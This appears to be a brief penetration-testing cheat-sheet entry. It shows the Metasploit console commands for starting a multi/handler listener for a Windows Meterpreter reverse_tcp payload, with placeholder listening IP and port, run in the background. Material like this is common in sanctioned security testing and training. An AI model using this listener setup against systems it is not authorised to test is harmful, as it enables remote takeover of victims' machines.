# Metasploit

## Meterpreter handler
```
msf> use multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf  exploit(handler) > set LHOST <Listening_IP>
msf exploit(handler) > set LPORT <Listening_Port>
msf exploit(handler) > run -j # run in background
```


